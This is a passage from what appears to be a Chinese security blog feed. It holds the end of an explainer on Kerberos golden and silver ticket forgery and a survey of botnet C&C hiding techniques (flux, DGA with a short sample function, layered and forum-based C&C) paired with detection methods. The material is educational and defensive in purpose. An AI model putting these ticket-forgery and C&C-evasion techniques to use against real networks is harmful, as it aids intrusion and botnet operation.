客户端的身份信息，用来待会客户端与服务器端通信时进行确认身份，<strong>其实Skey1和客户端身份信息合起来就是后面将会说的 TGS 也就是白银票据，可见白银票据是使用 服务器端的 master key加密的，是针对某个具体的服务器的，虽然伪造可以跳过 KDC 的认证，但是其影响面相对较小</strong>)，然后为了免于服务器端维护一个客户端和 Skey1 对应列表的负担，这两个信息都会先发送给客户端保存。</p><p>然后客户端通过自己的 master key 解密自己的那份信息(如果客户端是伪造的，不知道自己的 master key 则无法解密 KDC 发过来的信息)，然后用解密出来的 Skey1 加密自己的身份信息和一个时间戳(防止重放)，连同之前从KDC 得到的本来应该给服务器的那个用服务器端的 master key 加密的信息(TGS 白银票据)一同发送给服务器端，服务器端用自己的 master key 解密属于自己的那份信息(TGS 白银票据)，得到了 Skey1 和 客户端的身份信息，然后再用 Skey1 解密客户端发来的身份信息(这时候要校验时间戳是不是在可接受的范围内)，两者对比一下，从而认定客户端的身份。</p><p>我们发现，上面的步骤已经是的客户端和服务器端的认证过程使用了 Skey1 这个有短期时效的共享密钥，这样的话下一次想要通信的的时候只要该密钥没有过期就能免于之前的 KDC 重新生成一个 Skey1的繁琐步骤。但是你会发现客户端和 KDC 之间也是有类似客户端和服务器的身份认证过程，但是他们两个之间共享的唯一的密钥就是客户端的 master key 这个长期值(我们之前说过长期不变的值是不能作为共享密钥使用的，这会给了攻击者攻破的机会)，而客户端和 KDC 的认证过程又是非常重要的，因为这个过程负责传递给客户端 TGS(白银票据)，这也是整个身份认证的关键，所以我们还的想一个办法解决，从而让客户端和 KDC 之间的身份认证也用一个 短期密钥 Skey2 实现。</p><h3 id="3-TGT-出现解决客户端与-KDC-的密钥共享问题"><a href="#3-TGT-出现解决客户端与-KDC-的密钥共享问题" class="headerlink" title="3.TGT 出现解决客户端与 KDC 的密钥共享问题"></a><strong>3.TGT 出现解决客户端与 KDC 的密钥共享问题</strong></h3><p>介绍这节之前先要说一下 KDC 的 AS 和 TGS，其实 KDC 就分成这两个部分，见下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B2.png" alt="此处输入图片的描述"></p><p><strong>客户端将会从 AS 中获取 TGT(黄金票据) ，然后从 TGS 中获取 TGS(白银票据)</strong> </p><p>为了解决上一节提到的问题，TGT 出现了，客户端从 KDC 的 AS 获取这个票据以后，客户端就能向 KDC 的 TGS 申请 TGS(Skey1+客户端身份信息) 票据(这个票据是客户端用于向服务器申请与服务器进行通信的票据，详情请见上一节)</p><p>客户端向 KDC 的 AS 申请 TGT(这里客户端首先要用自的 master key 加密自己的身份信息和 KDC 的信息，这样是为了让 KDC 知道客户端是真的知道自己的 master key ，而不是随便一个人的请求) 后，KDC 的 AS 会生成一个短期共享密钥 Skey2 ，然后分别用客户端和 KDC 的 mastet key(<strong>实际上这个 master key 就是 krbtgt 的 hash</strong> ) 进行加密(用 KDC master key 加密的除了 Skey2 以外还有客户端的身份信息，<strong>其实这两个被加密的信息合起来就是 TGT ，也就是我们常常说的黄金票据，可见，这个票据是针对 KDC 的，而没有指定服务器，因此影响范围较大</strong>)，然后一并发送给客户端。</p><p>客户端用自己的 master key 解密获取到 Skey2 ，然后用这个Skey2对客户端的身份信息以及想要访问的服务器的身份进行加密，连同刚刚获取的用 KDC 的 master key(krbtgt 的 hash )加密的数据一同发送到 KDC 的 TGS ，从而请求获取 TGS 票据，KDC 通过自己的 master key(krbtgt 的 hash) 解密数据，得到 Skey2 和客户端的身份，再通过 Skey2 解密客户端发来的另一个消息，确认客户端的身份，并且还能得到客户端想要访问的服务器，这样我们就又进入了我们之前讲过的第一步 <strong>“KDC 作为可信第三方分配共享密钥Skey1”</strong></p><h2 id="0X03-伪造票据的利用方法"><a href="#0X03-伪造票据的利用方法" class="headerlink" title="0X03 伪造票据的利用方法"></a><strong>0X03 伪造票据的利用方法</strong></h2><p>上一节中详细介绍了 Kerberos 的认证过程，并且指明了认证过程中的 TGT 就是所谓的黄金票据， TGS 就是所谓的白银票据，那么我们在攻击中该怎么利用呢？这是我们这一小节的内容</p><h3 id="1-黄金票据-Golden-Ticket"><a href="#1-黄金票据-Golden-Ticket" class="headerlink" title="1.黄金票据(Golden Ticket)"></a><strong>1.黄金票据(Golden Ticket)</strong></h3><p>先假设这么一种情况,原先已拿到的域内所有的账户hash,包括krbtgt这个账户,由于有些原因导致域管权限丢失,但好在你还有一个普通域用户权限,碰巧管理员在域内加固时忘记重置krbtgt密码,基于此条件,我们还能利用该票据重新获得域管理员权限,利用krbtgt的HASH值可以伪造生成任意的TGT(使用 mimikatz),能够绕过对任意用户的账号策略,让用户成为任意组的成员,可用于Kerberos认证的任何服务(如果你看到这里还是不理解为什么有了 krbtgt hash 就能伪造一切，请回到上面再仔细地分析一下整个流程)</p><h3 id="2-白银票据-Silver-Ticket"><a href="#2-白银票据-Silver-Ticket" class="headerlink" title="2.白银票据(Silver Ticket)"></a><strong>2.白银票据(Silver Ticket)</strong></h3><p>通过观察Kerberos协议的认证过程不难发现,如果我们获取了服务器端的 master key ,就可以伪造 TGS 从而跳过KDC的认证，直接和目标Server通信</p><h2 id="0X04-关于黄金票据和白银票据的一些区别"><a href="#0X04-关于黄金票据和白银票据的一些区别" class="headerlink" title="0X04 关于黄金票据和白银票据的一些区别:"></a><strong>0X04 关于黄金票据和白银票据的一些区别:</strong></h2><h3 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a><strong>1.访问权限不同</strong></h3><p>(1)Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限<br>(2)Silver Ticket: 伪造TGS,只能访问指定的服务</p><h3 id="2-加密方式不同"><a href="#2-加密方式不同" class="headerlink" title="2.加密方式不同"></a><strong>2.加密方式不同</strong></h3><p>(1)Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密<br>(2)Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</p><h3 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a><strong>3.认证流程不同</strong></h3><p>(1)Golden Ticket 的利用过程需要访问域控(KDC)<br>(2)Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</p><h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>本文简单的梳理了一下 Kerberos 的认证过程(可能需要一点密码学的基本知识)，虽然没有配图，不过我觉得我讲的条例还算清晰，至少我是把我自己给说懂了,hhh，图以后有时间再一点点配吧。</p><h2 id="0X07-参考链接"><a href="#0X07-参考链接" class="headerlink" title="0X07 参考链接"></a><strong>0X07 参考链接</strong></h2><p><a href="https://blog.csdn.net/wulantian/article/details/42418231">https://blog.csdn.net/wulantian/article/details/42418231</a><br><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</a><br><a href="https://adsecurity.org/?p=1515">https://adsecurity.org/?p=1515</a><br><a href="http://www.mottoin.com/tech/119164.html">http://www.mottoin.com/tech/119164.html</a><br><a href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></p>]]></content>
    
    
    <categories>
      
      <category>Kerberos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C&amp;C控制服务的设计和侦测方法综述(Drops from wooyun)</title>
    <link href="/2019/03/13/C&amp;C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E4%BE%A6%E6%B5%8B%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0(Drops%20from%20wooyun)/"/>
    <url>/2019/03/13/C&amp;C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E4%BE%A6%E6%B5%8B%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0(Drops%20from%20wooyun)/</url>
    
    <content type="html"><![CDATA[<p>这篇文章总结了一些我在安全工作里见到过的千奇百怪的C&amp;C控制服务器的设计方法以及对应的侦测方法，在每个C&amp;C控制服务先介绍黑帽部分即针对不同目的的C&amp;C服务器设计方法，再介绍白帽部分即相关侦测办法，大家来感受一下西方的那一套。这里的白帽部分有一部分侦测方法需要一些数据和统计知识，我也顺便从原理上简单讨论了一下用数据进行安全分析的方法，从数学和数据原理上思考为什么这么做，可以当作数据科学在安全领域的一些例子学习一下。</p><h2 id="0x00-什么是C-C服务器"><a href="#0x00-什么是C-C服务器" class="headerlink" title="0x00 什么是C&amp;C服务器"></a><strong>0x00 什么是C&amp;C服务器</strong></h2><p>C&amp;C服务器(又称CNC服务器)也就是 Command &amp; Control Server，<strong>一般是指挥控制僵尸网络botnet的主控服务器</strong>，用来和僵尸网络的每个感染了恶意软件(malware)的宿主机进行通讯并<strong>指挥它们的攻击行为</strong>。每个malware的实例通过和它的C&amp;C服务器通讯获得指令进行攻击活动，包括获取DDoS攻击开始的时间和目标，上传从宿主机偷窃的到的信息，定时给感染机文件加密勒索等。</p><span id="more"></span><p>为什么malware需要主动和C&amp;C服务通讯?因为多数情况下malware是通过钓鱼邮件啊等方法下载到感染宿主机，攻击者并不能主动得知malware被谁下载，也不能主动得知宿主机的状态(是否开机是否联网等)，除非malware主动告诉他，<strong>所以malware都会内置一套寻找C&amp;C主控服务器的方法以保持和C&amp;C的联络和断线重连</strong>。C&amp;C控制服务的攻防要点在于，<strong>攻击者能不能欺骗防御者成功隐藏C&amp;C服务</strong>：如果防御者侦测到了隐藏的C&amp;C服务，通过一些技术(封禁域名和IP等)或者非技术手段(汇报给安全应急中心等)切断malware和C&amp;C之间的联系，就可以有效的摧毁botnet。</p><p>寻找到C&amp;C之后malware和C&amp;C之间的通讯方式并不是本文攻防重点，它可以是SSH文件传输也可以是简单的HTTP GET和POST，技巧性不是很大，不多的几个靠传输来隐藏的技巧比如用DNS隧道隐藏流量这类方法如果有需要以后再来一发详细阐述。</p><h2 id="0X01-IP地址：难度低，易被抓"><a href="#0X01-IP地址：难度低，易被抓" class="headerlink" title="0X01 IP地址：难度低，易被抓"></a><strong>0X01 IP地址：难度低，易被抓</strong></h2><p>这是最常见的一类C&amp;C服务器。攻击者在恶意软件的代码里<strong>硬编码写上C&amp;C服务器的IP地址</strong>，然后在需要和C&amp;C通讯的时候用HTTP拉取需要的攻击指令或者上传从宿主感染机上盗取的信息等等。</p><p>这并不是一个高级的办法，因为如果malware的二进制代码被获取，<strong>这种用IP的方法很容易被安全人员通过反向工程二进制代码或者检测蜜罐流量得到C&amp;C服务器的地址</strong>，从而汇报给服务提供商封禁IP。所以这种方法并不能有效隐藏C&amp;C服务，IP被抓了被反毒软件更新病毒库以后整个botnet就被摧毁了。现在国内的多数malware的主控服务器都是以这种拼运气不被抓的方式存在，他们靠的是malware数量多，今天抓一个当天就再出来三个，市场竞争很激烈。</p><p>国外用IP的C&amp;C服务器一般是在Amazon AWS之类的云服务器上，通知了服务提供商很容易封禁IP。国内的云服务商态度暧昧，不过也算还行吧。有机智的国内malware作者在东南亚地区租用云服务IP，可以有效避开国内监管而且速度不错(我并不是教你这么做啊)。</p><p>安全人员也不要以为这个方法低级就以为能轻易有效防御，比如说如果感染机不能安装防毒软件或者根本你就不知道中毒了。最近的一个例子是最近比较火的植入路由器的Linux&#x2F;Xor.DDOS，它的C&amp;C控制就是在AWS上面的IP，造成的影响很大，因为多数人并不知道路由器会被大规模植入恶意软件，路由器本身也很少有防护，正好适合用IP做C&amp;C，还省去了复杂的域名算法和DNS查询的代码保证了软件本身的轻量化。也由于路由本身常开的特性，路由木马也不用担心失去链接，一次C&amp;C的通讯可以保持连接很久，降低了木马被发现的机会。技巧虽然不华丽，但是用的好还是威力强大。该木马的详细分析参见<a href="http://blog.malwaremustdie.org/2015/09/mmd-0042-2015-polymorphic-in-elf.html">http://blog.malwaremustdie.org/2015/09/mmd-0042-2015-polymorphic-in-elf.html</a> 。</p><h2 id="0X02-单一C-C域名：难度较低，易被抓"><a href="#0X02-单一C-C域名：难度较低，易被抓" class="headerlink" title="0X02 单一C&amp;C域名：难度较低，易被抓"></a><strong>0X02 单一C&amp;C域名：难度较低，易被抓</strong></h2><p>因为硬编码的IP容易通过在二进制码内的字串段批量regex扫描抓到，<strong>一个变通的办法就是申请一些域名，比如idontthinkyoucanreadthisdomain.biz代替IP本身，扫描二进制码就不会立刻找到IP字段</strong>。这是个很广泛使用的方法，通常C&amp;C域名会名字很长，伪装成一些个人主页或者合法生意，甚至还有个假的首页。即使这么用心，这种方法还是治标不治本，侦测的方法也相对简单，原因是：</p><p>安全厂商比如Sophos等的资深安全人员经验丰富，他们会很快人工<strong>定位到恶意软件可能包含C&amp;C域名的函数，并且通过监测蜜罐的DNS查询数据，很快定位到C&amp;C域名</strong>。这些定位的域名会被上报给其他厂商比如运营商或者VirusTotal的黑名单。</p><p>新的C&amp;C域名会在DNS数据的异常检测里面形成一些特定的模式，通过数据做威胁感知的厂商很容易侦测到这些新出现的奇怪域名，并且通过IP和其他网络特征判定这是可疑C&amp;C域名。</p><p>所以常见的C&amp;C域名都在和安全厂商的黑名单比速度，如果比安全研究员反向工程快，它就赢了，但是最近的格局是随着基于数据的威胁感知越来越普遍，这些C&amp;C域名的生命周期越来越短，运气不好的通常活不过半个小时。攻击者也会设计更复杂的办法隐藏自己，因为注册域名需要一定费用，比如带隐私保护的.com域名需要好几十美元，寻找肉鸡植入木马也要费很大功夫，本来准备大干一场连攻半年结果半个小时就被封了得不偿失。</p><p>在这个速度的比赛里**，一个低级但是省钱方便技巧就是用免费二级域名**，比如3322家族啊vicp家族等不审查二级域名的免费二级域名提供商，最著名的例子就是Win32&#x2F;Nitol家族，搞的微软靠法院判来3322.org的所有权把他们整个端了(虽然后来域名控制权又被要回去了)。这个方法是国内malware作者最喜欢的一个方法，数据里常见一些汉语拼音类的C&amp;C域名，比如woshinidie.3322.org等喜感又不忘占便宜的二级域名，可能因为在我国申请顶级域名麻烦还费钱容易暴露身份，不如闷声发大财。你看，这也不是我在教你这么做啊。</p><p>真正有意思的是技术是，比较高级的C&amp;C域名都不止一个，通过一个叫做fast flux的办法隐藏自己。</p><h2 id="0X03-Fast-flux-double-flux-and-triple-flux"><a href="#0X03-Fast-flux-double-flux-and-triple-flux" class="headerlink" title="0X03 Fast flux, double flux and triple flux"></a><strong>0X03 Fast flux, double flux and triple flux</strong></h2><p>攻击者对付传统蜜罐和二进制分析的办法就是不要依靠单一C&amp;C，取而代之的是快速转换的C&amp;C域名列表(fast flux技术)：<strong>攻击者控制几个到几十个C&amp;C域名，这些域名都指向同一个IP地址</strong>，域名对应IP的DNS record每几个小时或者几天换一次，然后把这些C&amp;C域名分散的写到malware的代码里面。对于传统二进制分析来说，挂一漏万，<strong>如果不能把整个C&amp;C域名列表里面的所有域名放到黑名单上，就不能有效的摧毁这个恶意软件</strong>。这就比赛攻击者的隐藏代码能力和防御者的反向工程以及蜜罐监测能力了。这种方法叫做Fast flux，专门设计用来对付安全人员的人工分析。</p><p>防御Fast flux的方法在流量数据里看相对容易，比如威胁感知系统只需要简单的把每个域名解析指向的IP的历史数据**按照IP做一次group by就抓住了，**利用数据并不难嘛。所以应运而生有更高级double flux和triple flux的办法。</p><p>如果攻击者比较有钱，租用了多个IP地址，<strong>那么他可以在轮换C&amp;C域名的同时轮换IP地址</strong>，这样M个C&amp;C域名和N个IP地址可以有M*N种组合，如果设计的轮换时间稍微分散一些，会让蜜罐流量分析缺乏足够的数据支持。侦测double flux的办法需要一些简单的图知识（请系好安全带在家长陪同下观看）：</p><p>如果把每个域名和IP地址当做图的节点V，一个有效的域名-IP记录当做对应两个节点的边E，那么整个流量数据就可以表示为一个由V_域名指向V_IP的二分有向图。Double <strong>flux的图就是这个巨大二分有向图里的互相为满射的完全二分图</strong>，换句人话就是，存在这样一个子图，当中每个V_域名节点都指向同样一个集合的V_IP节点，而每个V_IP节点都被同一个集合的V_域名节点指向。图示如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/C&C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A11.jpg" alt="此处输入图片的描述"></p><p>当然了，感染的IP可以访问别的域名，比如图中google.com。在实际情况里，由于数据采集时间的限制，每个IP节点都要访问所有C&amp;C域名这个条件可以放宽。</p><p>当攻击者得知安全人员居然可以用图论的方法干掉他们的double flux这么高级的设计方法之后，更疯狂的triple flux出现了：每个域名的记录里不仅可以添加A record也就是IP的指向，还可以选定不同的命名服务器Name server来解析这个域名，如果攻击者足够有钱（以及有时间精力），他可以控制K个name server定时或者不定时轮换，这样可以造成M*N*K种组合。</p><p>Triple flux方法看似机智，好像跑得比谁都快，其实在实现上聪明反被聪明误，漏洞就在name server的设置上：多数正常服务的name server都是专有服务，而多数C&amp;C多架设在免费name server比如DNSpod的免费服务器上。如果攻击者能够控制自己的一系列name server专门作fast flux，这些server并不是常见的name server。任何非常见的服务器域名都会在流量数据的异常检测里面被监测出来，上一节里面提到异常检测侦测C&amp;C域名的方法对triple flux里面的name server也是可用的。你看，攻击者Naive了吧。</p><p>对于fast flux这一类特定flux类方法的监测还有另外一个基于数据和机器学习的方法：如果仔细思考一下fast flux，我们也会发现攻击者试图创造一个聪明的办法，但这种办法本身有一个致命缺陷，也就是追求fast，它的域名对IP的记录转换太快了，导致每个域名纪录的存活时间TTL被迫设计的很短，而绝大多数的正常服务并不会有如此快速的域名对应IP的记录转换，大型网站的负载均衡和CDN服务的IP纪录转换和fast flux有截然不同的特征。这些特征可以很容易被机器学习算法利用判别fast flux的僵尸网络，相关研究可以参看比如<a href="https://www.syssec.rub.de/media/emma/veroeffentlichungen/2012/08/07/Fastflux-Malware08.pdf%E7%AD%89%E8%BE%83%E6%97%A9%E7%A0%94%E7%A9%B6fast">https://www.syssec.rub.de/media/emma/veroeffentlichungen/2012/08/07/Fastflux-Malware08.pdf等较早研究fast</a> flux的论文。</p><h2 id="0X04-使用随机DGA算法：难度较高，不易被抓"><a href="#0X04-使用随机DGA算法：难度较高，不易被抓" class="headerlink" title="0X04 使用随机DGA算法：难度较高，不易被抓"></a><strong>0X04 使用随机DGA算法：难度较高，不易被抓</strong></h2><p><strong>DGA域名生成算法 (Domain Generation Algorithm) 是现在高级C&amp;C方法的主流</strong>，多见于国外各大活跃的恶意软件里，在VirusTotal里如果见到看似随机的C&amp;C域名都算这一类。**它的基本设计思想是，绝不把域名字符串放到malware代码里，**而是写入一个确定随机算法计算出来按照一个约定的随机数种子计算出一系列候选域名。攻击者通过同样的算法和约定的种子算出来同样列表，并注册其中的一个到多个域名。这样malware并不需要在代码里写入任何字符串，而只是要遵守这个约定就好。这个方法厉害在于，这个随机数种子的约定可以不通过通讯完成，比如当天的日期，比如当天twitter头条等。这种方法在密码学里称之为puzzle challenge，也就是控制端和被控端约好一个数学题，有很多答案，控制端选一个，被控端都给算出来，总有一个答上了。</p><p>一个简单的例子（引用自wikipedia）比如说这段代码可以用今天2015年11月3日当做种子生成cqaqofiwtfrbjegt这个随机字符串当做今天的备选C&amp;C域名：</p><pre><code class="hljs">def generate_domain(year, month, day):&quot;&quot;&quot;Generates a domain name for the given date.&quot;&quot;&quot;domain = &quot;&quot;    for i in range(16):        year = ((year ^ 8 * year) &gt;&gt; 11) ^ ((year &amp; 0xFFFFFFF0) &lt;&lt; 17)        month = ((month ^ 4 * month) &gt;&gt; 25) ^ 16 * (month &amp; 0xFFFFFFF8)        day = ((day ^ (day &lt;&lt; 13)) &gt;&gt; 19) ^ ((day &amp; 0xFFFFFFFE) &lt;&lt; 12)        domain += chr(((year ^ month ^ day) % 25) + 97)    return domain</code></pre><p>DGA方法的代表做就是Conficker，它的分析论文可以在这里找到：<a href="http://www.honeynet.org/papers/conficker">http://www.honeynet.org/papers/conficker</a> <strong>它的基本思想是用每天的日期当做随机数种子生成几百到几千不等的伪随机字符串，然后在可选的域名后缀比如.com .cn .ws里面挑选后缀生成候选的C&amp;C域名，攻击者用同样算法和种子得到同样的列表，然后选择一个注册作为有效的C&amp;C</strong>。安全人员即使抓到了二进制代码，在汇编语言里面反向出来这个随机数生成算法也远比搜索字符串难的多，所以DGA是个有效防止人工破解的方法。最近几年使用DGA算法的恶意软件里，Conficker的方法是被研究人员反向工程成功，Zeus是因为源码泄漏，其他的解出来DGA算法的案例并不多。</p><p>如果一个DGA算法被破解，安全人员可以用sinkhole的办法抢在攻击者之前把可能的域名都抢注并指向一个无效的IP。这种方法虽然有安全公司在做，但费时费力，是个绝对雷锋的做法，因为注册域名要钱啊，每天备选的域名又很多，都给注册了很贵的。现在常见的Torpig之类的C&amp;C域名被sinkhole。更便宜有效的另外一个方法就是和DNS厂商合作，比如Nominum的Vantio服务器上TheatAvert服务可以实时推送DGA名单并禁止这些域名解析，使用了ThreatAvert的服务商就不会解析这些C&amp;C域名，从而阻断了恶意软件和C&amp;C域名的通讯。</p><p>从数据分析上可以看到DGA的另一个致命缺点就在于生成了很多备选域名。攻击者为了更快速的发起攻击，比如攻击者的客户要求付钱之后半小时内发起DDoS攻击，那么C&amp;C的查询频率至少是每半小时，这就导致botnet对于C&amp;C的查询过于频繁。虽然DGA本身看起来像是隐藏在众多其他合法流量里，但是现在已经有很多有针对DGA的各个特性算法研究，比如鄙人的<a href="http://www.anquan.us/static/drops/tips-6220.html">用机器学习识别随机生成的C&amp;C域名</a>里面利用到了DGA的随机性等其它特性进行判别，安全研究人员可以用类似算法筛选疑似DGA然后根据频繁访问这些DGA域名的IP地址等其他特征通过图论或其他统计方法判别C&amp;C服务和感染的IP等。</p><h2 id="0X05-高级变形DGA：如果DGA看起来不随机"><a href="#0X05-高级变形DGA：如果DGA看起来不随机" class="headerlink" title="0X05 高级变形DGA：如果DGA看起来不随机"></a><strong>0X05 高级变形DGA：如果DGA看起来不随机</strong></h2><p>基于DGA侦测的多数办法利用DGA的随机性，所以现在高级的DGA一般都用字典组合，比如ObamaPresident123.info等等看起来远不如cqaqofiwtfrbjegt.info可疑，攻击者利用这种方法对付威胁感知和机器学习方法的侦测。最近的一个例子出现在Cisco的<a href="https://blogs.cisco.com/security/talos/detecting-dga">一篇blog</a>里面提到的DGA就是一个很小的硬编码在代码里字典文件，通过单词的组合生成C&amp;C域名。这些字典组合的DGA看起来并不随机，多数论文和blog里针对随机DGA机器学习的办法就不管用了。</p><p>对于这种DGA暂时并没有成熟有效的侦测方法，因为字典是未知的，可以是英语词汇，可以是人名，可以是任何语言里的单词。常用的方法还是基于随机DGA里面用到过的n-gram方法，比如用已知的DGA的n-gram分布判断未知DGA，同时结合其它的特征比如解析的IP等等，或者利用DGA频繁查询的特性用n-gram特征作聚类。相关论文可以自行使用“Algorithmically Generated Domains”等关键词搜索</p><h2 id="0X06-多层混合C-C，跟着我左手右手一个慢动作：难度最高，不易被抓"><a href="#0X06-多层混合C-C，跟着我左手右手一个慢动作：难度最高，不易被抓" class="headerlink" title="0X06 多层混合C&amp;C，跟着我左手右手一个慢动作：难度最高，不易被抓"></a><strong>0X06 多层混合C&amp;C，跟着我左手右手一个慢动作：难度最高，不易被抓</strong></h2><p>在DGA部分提到了，DGA的致命缺点在于被动查询，如果想要快速启动攻击就必须让malware频繁查询C&amp;C，导致C&amp;C查询数据上异常于正常的查询流量。多层混合C&amp;C可以有效避免这个问题，是个丢卒保帅的战术。这种方法在亚洲区的malware里面见到过很少几次。</p><p><strong>比如攻击者设计一个两层的C&amp;C网络，Boss级的C&amp;C使用主域名列表比如.com域名，Soldier杂兵级C&amp;C用免费二级域名列表比如woshinidaye.3322.org，malware每天查询一次Boss级C&amp;C拉取当天杂兵C&amp;C域名列表，然后以一分钟一次的频率查询杂兵C&amp;C域名，接受攻击指令</strong>，示意图如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/C&C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A12.jpg" alt="此处输入图片的描述"></p><p><strong>侦测和封禁这类高级混合C&amp;C难点在于：</strong></p><ul><li><p>在数据里，Boss级的C&amp;C出现几率很低，可以不定时也可以一周一次，如果用一些早就注册过的域名或者通过黑进他人服务器利用无辜域名，Boss级的C&amp;C很容易逃过异常检测。</p></li><li><p>数据里可以检测到的是频繁查询的低级的杂兵C&amp;C域名。如果把这些域名封禁，malware在下一轮更新杂兵C&amp;C列表后会使这种封禁方法无效。杂兵域名就是主动跑上来送死的，反正二级域名不要钱。</p></li><li><p>更高级的做法是，如果Boss级的C&amp;C列表里的域名用完了，它可以通过这个两层网络实时推送新的Boss级C&amp;C列表。你看人家都不需要DGA这么麻烦。<br>侦测和防御方法需要一些数据和图论的知识，具体参考侦测double flux的模型，同样是两层网络，不同点在于两层节点都是域名节点，留作课后作业，这里就不赘述了。针对实现上另一个特征是，杂兵域名主要目的是来送死，他们的价格往往不高，比如免费二级域名或者免费的ccTLD或者gTLD后缀，利用这个特征可以把第二层网络的尺度缩小，从而在图数据库的计算速度上有不小的提升。</p></li></ul><h2 id="0X07-利用Twitter-Reddit等论坛：难度低，被抓看运气"><a href="#0X07-利用Twitter-Reddit等论坛：难度低，被抓看运气" class="headerlink" title="0X07 利用Twitter Reddit等论坛：难度低，被抓看运气"></a><strong>0X07 利用Twitter Reddit等论坛：难度低，被抓看运气</strong></h2><p>前面提到的办法多是攻击者自己架设服务器，如果攻击者的C&amp;C域名被发现封禁了，这个botnet就被摧毁了。机智的攻击者就想到了通过论坛发帖的办法，<strong>比如在Twitter发一条在特定冷门话题下的包含C&amp;C指令的tweet或者reddit上面找个十分冷门的subreddit发个包含控制指令的贴，这样即使被运营商或者安全研究小组发现了，人家总不能把推特和reddit封了吧</strong>（我说的是美国政府没有这个权利）。去年被抓住的名为<a href="https://vms.drweb.com/virus/?i=4161206">Mac.BackDoor.iWorm</a>的恶意软件就是利用reddit做C&amp;C控制服务器，具体细节请参考<a href="http://news.drweb.com/show/?i=5976&lng=en&c=1">http://news.drweb.com/show/?i=5976&amp;lng=en&amp;c=1</a> 也有把C&amp;C信息隐藏在一篇看起来很正常的文章里面防止被发现，比如MIT的这个把加密消息隐藏在一篇论文里的有趣的demo <a href="https://pdos.csail.mit.edu/archive/scigen/scipher.html">https://pdos.csail.mit.edu/archive/scigen/scipher.html</a> 不过在实际工作里暂时还没有看到这么高科技的C&amp;C做法（你看我也不是教你这么做啊）。</p><p>这种方法不适合国内的大环境，因为国外论坛发帖是不举报不删帖很容易闷声发大财，但是水能载舟，亦可赛艇，国内由于发帖的身份控制严格，如果用这个方法很可能被眼尖的版主发现汇报给警察叔叔。而且新浪微博发C&amp;C控制微博也不现实，微博为了防爬虫要强制登陆而且微博那个API的麻烦程度你也是知道的。所以这个方法只是拓展视野，顺便写个段子。</p><p>这里必须要插入一个段子了。一个真实的故事就是，我们抓到了一个做DDoS攻击的botnet，我们的模型告诉我这些攻击流量和twitter.com的访问流量有强相关，经过细致研究发现，这个bot可能用twitter的关键词当随机数种子生成攻击DGA域名。但奇怪的是，同一个bot感染的IP列表里面，中国区IP的随机数种子似乎有初始化的问题，每次的种子都是一样的。我们机智的抓住了这一点，把中国区当做对比组反向出了DGA算法：因为一个特殊的原因中国区感染IP不能访问twitter，如果认为中国区的DGA种子总是空字符串，我们对比中国区的DGA和其他地区的DGA差不多可以猜出来它的DGA的方法，从而反向工程出来它们的DGA算法。这里需要感谢一下国家。</p><h2 id="0X08-一些其它的高级技术"><a href="#0X08-一些其它的高级技术" class="headerlink" title="0X08 一些其它的高级技术"></a><strong>0X08 一些其它的高级技术</strong></h2><p>限于篇幅限制有一些现阶段不太常用的C&amp;C技术在这里仅仅简单描述一下，有兴趣的观众朋友们可以自行搜索。</p><h3 id="1-利用P2P网络的C-C。"><a href="#1-利用P2P网络的C-C。" class="headerlink" title="1.利用P2P网络的C&amp;C。"></a><strong>1.利用P2P网络的C&amp;C。</strong></h3><p>如果一个僵尸网络里面所有的感染IP互相成为对方的C&amp;C控制服务器，看起来很难摧毁所有的C&amp;C。侦测重点在这个网络初始化的时候，就好比其它的BT下载必须从一个种子或者磁力链开始，当感染IP访<br>问初始化C&amp;C的时候，它还是需要用上面说到的C&amp;C方法，只是频率很低。</p><h3 id="2-IRC通讯"><a href="#2-IRC通讯" class="headerlink" title="2.IRC通讯."></a><strong>2.IRC通讯.</strong></h3><p>这是一个传统历史悠久的C&amp;C控制方法。因为现在日常生活里IRC已经被一些即时消息服务比如微信等等取代，很少有普通群众会用到IRC，年轻的安全人员可能会忽视IRC这个老办法。办法虽老，但是用处广泛，好比T－800机器人，”Old, but not obsolete.”</p><h3 id="3-你知道还可以手动C-C么？"><a href="#3-你知道还可以手动C-C么？" class="headerlink" title="3.你知道还可以手动C&amp;C么？"></a><strong>3.你知道还可以手动C&amp;C么？</strong></h3><p>我就见过在乡镇政府内网留了Windows Server 2003后门手工进去挨个启动的，毫无PS痕迹，嗯。</p><h2 id="0X09-结语"><a href="#0X09-结语" class="headerlink" title="0X09 结语"></a><strong>0X09 